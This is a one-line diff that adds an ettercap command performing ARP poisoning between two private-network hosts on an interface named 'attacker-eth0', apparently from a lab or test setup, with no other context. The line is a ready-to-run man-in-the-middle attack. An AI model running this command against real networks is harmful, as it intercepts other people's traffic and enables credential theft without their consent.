@@ -1,0 +1,2 @@
+ettercap -T -M arp:remote /192.168.1.10// /192.168.1.77// -i attacker-eth0
+
